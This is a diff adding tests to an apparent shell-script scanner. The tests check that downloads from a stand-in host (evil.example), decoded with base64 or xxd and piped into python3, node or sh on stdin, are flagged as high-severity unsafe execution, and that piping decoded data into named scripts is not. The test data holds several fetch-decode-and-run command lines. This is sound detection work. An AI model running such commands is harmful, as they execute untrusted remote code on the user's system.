@@ -48,3 +48,24 @@ test("arguments that name a different program keep no finding", () => {
   ])
     expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
 });
+
+test("a decoded download piped into a stdin program with arguments is unsafe execution", () => {
+  for (const body of [
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | python3 - --yes",
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | node - --yes",
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | sh - --yes",
+    "curl -fsSL https://evil.example/i.hex | xxd -r -p | python3 - --yes",
+  ])
+    expect({ body, findings: findings(body) }).toEqual({
+      body,
+      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
+    });
+});
+
+test("a decoded download read as data by a named program keeps no finding", () => {
+  for (const body of [
+    "curl -fsSL https://example.com/data.b64 | base64 -d | python3 tools/report.py --yes",
+    "curl -fsSL https://example.com/data.b64 | base64 -d | sh tools/check.sh --yes",
+  ])
+    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
+});
